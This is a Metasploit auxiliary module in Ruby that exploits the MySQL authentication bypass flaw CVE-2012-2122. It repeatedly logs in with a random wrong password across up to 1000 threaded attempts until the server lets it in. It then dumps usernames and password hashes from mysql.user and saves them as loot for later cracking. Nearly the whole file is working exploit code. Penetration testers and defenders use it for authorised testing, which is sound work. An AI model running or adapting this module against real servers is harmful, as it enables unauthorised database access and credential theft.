##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::MYSQL
  include Msf::Auxiliary::Report

  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'MySQL Authentication Bypass Password Dump',
      'Description'    => %Q{
          This module exploits a password bypass vulnerability in MySQL in order
        to extract the usernames and encrypted password hashes from a MySQL server.
        These hashes ares stored as loot for later cracking.
      },
      'Author'        => [
          'theLightCosine', # Original hashdump module
          'jcran'                                              # Authentication bypass bruteforce implementation
        ],
      'References'     => [
          ['CVE', '2012-2122'],
          ['OSVDB', '82804'],
          ['URL', 'https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql']
        ],
      'DisclosureDate' => 'Jun 09 2012',
      'License'        => MSF_LICENSE
    )

    deregister_options('PASSWORD')
    register_options( [
      OptString.new('USERNAME', [ true, 'The username to authenticate as', "root" ])
    ], self.class )
  end


  def run_host(ip)

    # Keep track of results (successful connections)
    results = []

    # Username and password placeholders
    username = datastore['USERNAME']
    password = Rex::Text.rand_text_alpha(rand(8)+1)

    # Do an initial check to see if we can log into the server at all

    begin
      socket = connect(false)
      x = ::RbMysql.connect({
        :host           => rhost,
        :port           => rport,
        :user           => username,
        :password       => password,
        :read_timeout   => 300,
        :write_timeout  => 300,
        :socket         => socket
        })
      x.connect
      results << x

      print_good "#{rhost}:#{rport} The server accepted our first login as #{username} with a bad password"

    rescue RbMysql::HostNotPrivileged
      print_error "#{rhost}:#{rport} Unable to login from this host due to policy (may still be vulnerable)"
      return
    rescue RbMysql::AccessDeniedError
      print_good "#{rhost}:#{rport} The server allows logins, proceeding with bypass test"
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error "#{rhost}:#{rport} Error: #{e}"
      return
    end

    # Short circuit if we already won
    if results.length > 0
      @mysql_handle = results.first
      return dump_hashes
    end


    #
    # Threaded login checker
    #
    max_threads = 16
    cur_threads = []

    # Try up to 1000 times just to be sure
    queue   = [*(1 .. 1000)]

    while(queue.length > 0)
      while(cur_threads.length < max_threads)

        # We can stop if we get a valid login
        break if results.length > 0

        # keep track of how many attempts we've made
        item = queue.shift

        # We can stop if we reach 1000 tries
        break if not item

        # Status indicator
        print_status "#{rhost}:#{rport} Authentication bypass is #{item/10}% complete" if (item % 100) == 0

        t = Thread.new(item) do |count|
          begin
            # Create our socket and make the connection
            s = connect(false)
            x = ::RbMysql.connect({
              :host           => rhost,
              :port           => rport,
              :user           => username,
              :password       => password,
              :read_timeout   => 300,
              :write_timeout  => 300,
              :socket         => s,
              :db             => nil
              })
            print_status "#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
            results << x
          rescue RbMysql::AccessDeniedError
          rescue Exception => e
            print_status "#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}"
          end
        end

        cur_threads << t

      end

      # We can stop if we get a valid login
      break if results.length > 0

      # Add to a list of dead threads if we're finished
      cur_threads.each_index do |ti|
        t = cur_threads[ti]
        if not t.alive?
          cur_threads[ti] = nil
        end
      end

      # Remove any dead threads from the set
      cur_threads.delete(nil)

      ::IO.Rex.sleep(0.25)
    end

    # Clean up any remaining threads
    cur_threads.each {|x| x.kill }


    if results.length > 0
      print_good("#{rhost}:#{rport} Successfully exploited the authentication bypass flaw, dumping hashes...")
      @mysql_handle = results.first
      return dump_hashes
    end

    print_error("#{rhost}:#{rport} Unable to bypass authentication, this target may not be vulnerable")
  end

  def dump_hashes

    # Grabs the username and password hashes and stores them as loot
    res = mysql_query("SELECT user,password from mysql.user")
    if res.nil?
      print_error("#{rhost}:#{rport} There was an error reading the MySQL User Table")
      return

    end

    # Create a table to store data
    tbl = Rex::Ui::Text::Table.new(
      'Header'  => 'MysQL Server Hashes',
      'Indent'   => 1,
      'Columns' => ['Username', 'Hash']
    )

    if res.size > 0
      res.each do |row|
        next unless (row[0].to_s + row[1].to_s).length > 0
        tbl << [row[0], row[1]]
        print_good("#{rhost}:#{rport} Saving HashString as Loot: #{row[0]}:#{row[1]}")
      end
    end

    this_service = nil
    if framework.db and framework.db.active
      this_service = report_service(
        :host  => rhost,
        :port => rport,
        :name => 'mysql',
        :proto => 'tcp'
      )
    end

    report_hashes(tbl.to_csv, this_service) unless tbl.rows.empty?

  end

  # Stores the Hash Table as Loot for Later Cracking
  def report_hashes(hash_loot,service)
    filename= "#{rhost}-#{rport}_mysqlhashes.txt"
    path = store_loot("mysql.hashes", "text/plain", rhost, hash_loot, filename, "MySQL Hashes", service)
    print_status("#{rhost}:#{rport} Hash Table has been saved: #{path}")

  end

end
